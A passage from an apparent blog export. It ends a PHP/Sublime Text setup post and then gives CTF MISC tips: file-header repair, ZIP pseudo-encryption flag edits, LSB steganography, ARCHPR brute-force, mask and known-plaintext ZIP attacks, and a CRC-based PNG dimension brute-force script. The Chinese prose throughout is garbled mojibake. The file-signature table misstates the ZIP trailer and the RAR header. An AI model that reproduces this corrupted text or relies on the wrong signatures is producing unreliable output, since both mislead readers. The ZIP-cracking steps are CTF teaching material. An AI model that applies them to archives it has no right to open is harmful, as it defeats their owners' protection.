3åˆ›å»ºPHPç¼–è¯‘ç¯å¢ƒ</h2><p>åœ¨phpstudyæ–‡ä»¶ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå¤åˆ¶è·¯å¾„</p><p><img src="https://img-blog.csdnimg.cn/20201014210142241.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å³å‡»æ­¤ç”µè„‘ï¼Œç‚¹å‡»å±æ€§-&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®-&gt;ç¯å¢ƒå˜é‡</p><p>åœ¨ç³»ç»Ÿå˜é‡é‡Œé¢æ‰¾åˆ°Pathï¼Œç‚¹å‡»ç¼–è¾‘ï¼Œå¡«å…¥ä¸Šé¢æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼Œç„¶åç‚¹å‡»ç¡®å®š</p><p><img src="https://img-blog.csdnimg.cn/20201014210356900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ£€æµ‹ä¸Šé¢é…ç½®æ˜¯å¦æˆåŠŸï¼Œé‡æ–°æ‰“å¼€ä¸€ä¸ªcmdå‘½ä»¤çª—ä½“ï¼Œè¾“å…¥å‘½ä»¤<code>php -h</code>æŸ¥çœ‹æ˜¯å¦ä¼šæç¤ºphpçš„å‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼Œæœ‰æç¤ºåˆ™è¡¨ç¤ºä¸Šé¢æ­¥éª¤å·²æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201014212428202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€Sublime Text 3ï¼Œç‚¹å‡»toolsï¼ŒBuild Systemï¼ŒNew Build System<br><img src="https://img-blog.csdnimg.cn/2020101421103991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20201014211112480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é»˜è®¤çš„å†…å®¹æ˜¯ï¼š<code>&#123; &quot;shell_cmd&quot;: &quot;make&quot;&#125;</code>ä¿®æ”¹ä¸ºï¼š<code>&#123; &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], &quot;file_regex&quot;: &quot;php$&quot;, &quot;selector&quot;: &quot;source.php&quot; &#125;</code><br><img src="https://img-blog.csdnimg.cn/20201014211625688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿å­˜åœ¨é»˜è®¤çš„ç›®å½•ä¸‹å³å¯ï¼Œæ³¨æ„ä¿®æ”¹æ–‡ä»¶åä¸º <code>php.sublime-build</code> ã€‚<br><img src="https://img-blog.csdnimg.cn/20201014211554919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é‡å¯sublime text3ï¼Œåœ¨è¿è¡Œphpæ—¶ä¸€å®šè®°å¾—è¦åˆ‡æ¢ï¼Œå°±å¯ä»¥ç”¨Ctrl+Bæ¥ç¼–è¯‘.phpæ–‡ä»¶äº†ï¼›ã€‚<br><img src="https://img-blog.csdnimg.cn/2020101421480068.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISCæ€»ç»“</title>
    <link href="/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/"/>
    <url>/2020/04/20/CTF-MISC%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šè®°å½•åšé¢˜é‡è§çš„ä¸åŒåˆ†ç±»çš„æ‚é¡¹é¢˜ï¼ŒæŒç»­æ›´æ–°â€¦</p> <a id="more"></a><blockquote><p>è®°å½•åšé¢˜é‡è§çš„ä¸åŒåˆ†ç±»çš„æ‚é¡¹é¢˜ï¼ŒæŒç»­æ›´æ–°â€¦</p></blockquote><p>@<a href="%E8%BF%99%E9%87%8C%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p><blockquote><p>è®°å½•åšé¢˜é‡è§çš„ä¸åŒåˆ†ç±»çš„æ‚é¡¹é¢˜ï¼ŒæŒç»­æ›´æ–°â€¦</p></blockquote><h2 id="1-çœ‹å›¾ç‰‡å±æ€§"><a href="#1-çœ‹å›¾ç‰‡å±æ€§" class="headerlink" title="1.çœ‹å›¾ç‰‡å±æ€§"></a>1.çœ‹å›¾ç‰‡å±æ€§</h2><p>æ ¹æ®æç¤ºï¼Œæ‰¾åˆ°å›¾ç‰‡å±æ€§,flagå°±å‡ºæ¥äº†<br><img src="https://img-blog.csdnimg.cn/20200404130443932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-éšè—åœ¨å­—èŠ‚ä¸­"><a href="#2-éšè—åœ¨å­—èŠ‚ä¸­" class="headerlink" title="2.éšè—åœ¨å­—èŠ‚ä¸­"></a>2.éšè—åœ¨å­—èŠ‚ä¸­</h2><p>æŠŠå›¾ç‰‡æ”¾å…¥010editorä¸­ï¼Œåœ¨æ–‡æœ¬ä¸­æœç´¢<code>SL&#123;</code></p><p><img src="https://img-blog.csdnimg.cn/20200404130740295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-è¡¥å……å¤´éƒ¨"><a href="#3-è¡¥å……å¤´éƒ¨" class="headerlink" title="3.è¡¥å……å¤´éƒ¨"></a>3.è¡¥å……å¤´éƒ¨</h2><table><thead><tr><th></th><th>å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´æ–‡ä»¶å°¾æ ¼å¼</th><th></th></tr></thead><tbody><tr><td>æ–‡ä»¶å</td><td>æ–‡ä»¶å¤´</td><td>æ–‡ä»¶å°¾</td></tr><tr><td>JPEG (jpg)</td><td>FFD8FF</td><td>FF D9</td></tr><tr><td>PNG (png)</td><td>89504E47</td><td>AE 42 60 82</td></tr><tr><td>GIF (gif)</td><td>47494638</td><td>00 3B</td></tr><tr><td>ZIP Archive (zip)</td><td>504B0304</td><td>FF D9</td></tr><tr><td>RAR Archive (rar)</td><td>50 4B</td><td></td></tr></tbody></table><p> å°†è¯¥å›¾ç‰‡ä»¥åå…­è¿›åˆ¶æ ¼å¼æ‰“å¼€ï¼Œå‘ç°è¯¥pngå›¾ç‰‡ç¼ºå¤±æ–‡ä»¶å¤´ï¼Œè¡¥å……pngæ–‡ä»¶å¤´89504E47<br><img src="https://img-blog.csdnimg.cn/20200404133820680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-ZIP"><a href="#4-ZIP" class="headerlink" title="4. ZIP"></a>4. ZIP</h2><h3 id="ZIPæ–‡ä»¶æ ¼å¼"><a href="#ZIPæ–‡ä»¶æ ¼å¼" class="headerlink" title="ZIPæ–‡ä»¶æ ¼å¼"></a>ZIPæ–‡ä»¶æ ¼å¼</h3><p>ä¸€ä¸ª ZIP æ–‡ä»¶ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š</p><blockquote><p>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº+å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</p></blockquote><p><strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</strong>ï¼š </p><blockquote><p>50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰<br>08 00ï¼šå‹ç¼©æ–¹å¼<br>20 9Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´<br>66 4Fï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>F2 1B 0F 4Aï¼šCRC-32æ ¡éªŒï¼ˆ4A0F1BF2ï¼‰<br>0E 00 00 00ï¼šå‹ç¼©åå°ºå¯¸<br>0C 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸<br>08 00ï¼šæ–‡ä»¶åé•¿åº¦<br>00 00ï¼šæ‰©å±•è®°å½•é•¿åº¦<br>66 6C 61 67 2E 74 78 74: æ–‡ä»¶åï¼ˆä¸å®šé•¿ï¼‰<br>4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: æ–‡ä»¶flag.txtå‹ç¼©åçš„æ•°æ®</p><p> <strong>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</strong>ï¼š<br>50 4B 01 02ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°(0x02014b50)<br>1F 00ï¼šå‹ç¼©ä½¿ç”¨çš„ pkware ç‰ˆæœ¬<br>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º09 00æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰<br>08 00ï¼šå‹ç¼©æ–¹å¼  20 9Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´  66 4Fï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ<br>F2 1B 0F 4Aï¼šCRC-32æ ¡éªŒï¼ˆ4A0F1BF2ï¼‰<br>0E 00 00 00ï¼šå‹ç¼©åå°ºå¯¸<br>0C 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸<br>08 00ï¼šæ–‡ä»¶åé•¿åº¦<br>24 00ï¼šæ‰©å±•å­—æ®µé•¿åº¦<br>00 00ï¼šæ–‡ä»¶æ³¨é‡Šé•¿åº¦<br>00 00ï¼šç£ç›˜å¼€å§‹å·<br>00 00ï¼šå†…éƒ¨æ–‡ä»¶å±æ€§<br>20 00 00 00ï¼šå¤–éƒ¨æ–‡ä»¶å±æ€§<br>00 00 00 00ï¼šå±€éƒ¨å¤´éƒ¨åç§»é‡</p></blockquote><p><strong>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—ï¼š</strong> </p><blockquote><p>50 4B 05 06ï¼šç›®å½•ç»“æŸæ ‡è®°<br>00 00ï¼šå½“å‰ç£ç›˜ç¼–å·<br>00 00ï¼šç›®å½•åŒºå¼€å§‹ç£ç›˜ç¼–å·<br>01 00ï¼šæœ¬ç£ç›˜ä¸Šçºªå½•æ€»æ•°<br>01 00ï¼šç›®å½•åŒºä¸­çºªå½•æ€»æ•°<br>5A 00 00 00ï¼šç›®å½•åŒºå°ºå¯¸å¤§å°<br>34 00 00 00ï¼šç›®å½•åŒºå¯¹ç¬¬ä¸€å¼ ç£ç›˜çš„åç§»é‡<br>00 00ï¼šZIP æ–‡ä»¶æ³¨é‡Šé•¿åº¦</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210112155557144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åŒºåˆ†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ— åŠ å¯†<br>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º00 00<br><br>ä¼ªåŠ å¯†         <br>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º00 00 <br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00<br><br>çœŸåŠ å¯†         <br>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€åŠ å¯†åº”å½“ä¸º09 00<br>ä¸”å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼ä½æ ‡è®°åº”å½“ä¸º09 00<br></code></pre></td></tr></table></figure><h3 id="çœŸåŠ å¯†"><a href="#çœŸåŠ å¯†" class="headerlink" title="çœŸåŠ å¯†"></a>çœŸåŠ å¯†</h3><p>æŠŠè¿™ä¸ªzipæ–‡ä»¶æ‹–å…¥winhexä¸­ï¼Œç”±å›¾ä¸­çš„ä¿¡æ¯å¯ä»¥çŸ¥é“æ˜¯çœŸåŠ å¯†<br><img src="https://img-blog.csdnimg.cn/20200420094603945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠŠ09 00ä¿®æ”¹ä¸º00 00ä¿å­˜åå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/2020042009474021.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ä¼ªåŠ å¯†"><a href="#ä¼ªåŠ å¯†" class="headerlink" title="ä¼ªåŠ å¯†"></a>ä¼ªåŠ å¯†</h3><p>ä¼ªåŠ å¯†ï¼ŒæŠŠå…¨æ–¹ä½æ ‡è®°åŒº çš„ 01 00  æˆ– 09  00 æ”¹ä¸º 00 00<br><img src="https://img-blog.csdnimg.cn/20201203120249158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5-LSBéšå†™"><a href="#5-LSBéšå†™" class="headerlink" title="5. LSBéšå†™"></a>5. LSBéšå†™</h2><p><img src="https://img-blog.csdnimg.cn/20200404134359585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç®€å•çš„LSBéšå†™ï¼Œåœ¨æœ€ä½æœ‰æ•ˆä½éšè—ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨Stegsolveæå–ã€‚<br><img src="https://img-blog.csdnimg.cn/20200404134450892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3d4,size_16,color_0000FF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="6-åŒå›¾"><a href="#6-åŒå›¾" class="headerlink" title="6. åŒå›¾"></a>6. åŒå›¾</h2><p><img src="https://img-blog.csdnimg.cn/20200404134600193.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†ä¸¤å¼ å›¾é‡å åï¼Œè¿›è¡Œå¼‚æˆ–ï¼Œå‡ºç°äº†ç–‘ä¼¼äºŒç»´ç çš„å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20200404135025932.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»Saveï¼Œå°†è¯¥å›¾ç‰‡ä¿å­˜ä¸‹æ¥ã€‚<br>æ‰“å¼€è¯¥å›¾ç‰‡ç»§ç»­è¿›è¡Œå¼‚æˆ–ï¼Œå¯ä»¥å¾—åˆ°ä¸‰å¼ äºŒç»´ç å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20200404135206843.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200404135220367.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200404135231251.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¾æ¬¡æ‰«æè¿™ä¸‰å¼ äºŒç»´ç å¯å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ç¬¬ä¸€å¼ ï¼šDES<br>ç¬¬äºŒå¼ ï¼š6XaMMbM7<br>ç¬¬ä¸‰å¼ ï¼šU2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c=<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¯¥ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“æ˜¯DESåŠ å¯†,è¿›è¡Œ<a href="https://www.sojson.com/encrypt_des.html">DESè§£å¯†</a><br><img src="https://img-blog.csdnimg.cn/20200404135732110.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹é¢‘è°±å›¾<br><img src="https://img-blog.csdnimg.cn/20201203095434653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="7-éŸ³é¢‘åˆ†æ"><a href="#7-éŸ³é¢‘åˆ†æ" class="headerlink" title="7. éŸ³é¢‘åˆ†æ"></a>7. éŸ³é¢‘åˆ†æ</h2><p>æŸ¥çœ‹é¢‘è°±å›¾<br><img src="https://img-blog.csdnimg.cn/20201203095434653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="8-å‹ç¼©åŒ…æš´åŠ›ç ´è§£"><a href="#8-å‹ç¼©åŒ…æš´åŠ›ç ´è§£" class="headerlink" title="8. å‹ç¼©åŒ…æš´åŠ›ç ´è§£"></a>8. å‹ç¼©åŒ…æš´åŠ›ç ´è§£</h2><p>ä½¿ç”¨ARCHPRå·¥å…·ï¼Œé€‰æ‹©Brute-forceæ¨¡å¼ï¼Œè¿›è¡Œæš´åŠ›ç ´è§£<br><img src="https://img-blog.csdnimg.cn/20210213160430902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="9-æ©ç æ”»å‡»"><a href="#9-æ©ç æ”»å‡»" class="headerlink" title="9. æ©ç æ”»å‡»"></a>9. æ©ç æ”»å‡»</h2><p>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…å’Œå›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20201112223438991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çŒœæµ‹å›¾ç‰‡é‡Œé¢çš„å†…å®¹æ˜¯å‹ç¼©åŒ…å¯†ç ï¼Œå†…å®¹æ˜¯<code>1317??7p9?</code>,è¿›è¡Œ<code>æ©ç æ”»å‡»</code>ï¼Œç»“æœæç¤ºé”™è¯¯ï¼Œå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œç»“æœå°†æ©ç ä¿®æ”¹æˆ<code>1317???7p9?</code>ç»“æœæˆåŠŸäº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201112224159242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="10-æ˜æ–‡æ”»å‡»"><a href="#10-æ˜æ–‡æ”»å‡»" class="headerlink" title="10. æ˜æ–‡æ”»å‡»"></a>10. æ˜æ–‡æ”»å‡»</h2><p><strong>[ACTFæ–°ç”Ÿèµ›2020]æ˜æ–‡æ”»å‡»</strong> </p><p>æŠŠå›¾ç‰‡æ‹–å…¥010Editorä¸­ï¼Œå‘ç°ä¸€ä¸ªflag.txt<br><img src="https://img-blog.csdnimg.cn/20210215201625262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤åˆ¶å®ŒååŠ ä¸Š 50 4Bï¼Œå˜æˆä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…1.zip<br><img src="https://img-blog.csdnimg.cn/20210215201421645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‹ç¼©åŒ…1.zipé‡Œé¢çš„flag.txtä¸åŠ å¯†å‹ç¼©åŒ…é‡Œé¢çš„flag.txtçš„CRCå€¼ä¸€æ ·<br><img src="https://img-blog.csdnimg.cn/20210215201942450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›è¡Œæ˜æ–‡æ”»å‡»<br><img src="https://img-blog.csdnimg.cn/20210215201404187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="11-å›¾ç‰‡é«˜å®½ä¿®æ”¹"><a href="#11-å›¾ç‰‡é«˜å®½ä¿®æ”¹" class="headerlink" title="11. å›¾ç‰‡é«˜å®½ä¿®æ”¹"></a>11. å›¾ç‰‡é«˜å®½ä¿®æ”¹</h2><h3 id="è®¡ç®—å›¾ç‰‡æ­£ç¡®å®½é«˜"><a href="#è®¡ç®—å›¾ç‰‡æ­£ç¡®å®½é«˜" class="headerlink" title="è®¡ç®—å›¾ç‰‡æ­£ç¡®å®½é«˜"></a>è®¡ç®—å›¾ç‰‡æ­£ç¡®å®½é«˜</h3><p>æŸ¥çœ‹å›¾ç‰‡crcå€¼</p><p><img src="https://img-blog.csdnimg.cn/20210315114302692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥CRCå€¼ä¸º0xab212a35ï¼Œè®¡ç®—å›¾ç‰‡æ­£ç¡®å®½é«˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br> <br>m = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctfshow.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>        c = m[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc = binascii.crc32(c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc == <span class="hljs-number">0xab212a35</span>:<br>            k = <span class="hljs-number">1</span><br>            print(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x556 0x5b7<br></code></pre></td></tr></table></figure><h3 id="çˆ†ç ´å›¾ç‰‡é«˜åº¦"><a href="#çˆ†ç ´å›¾ç‰‡é«˜åº¦" class="headerlink" title="çˆ†ç ´å›¾ç‰‡é«˜åº¦"></a>çˆ†ç ´å›¾ç‰‡é«˜åº¦</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 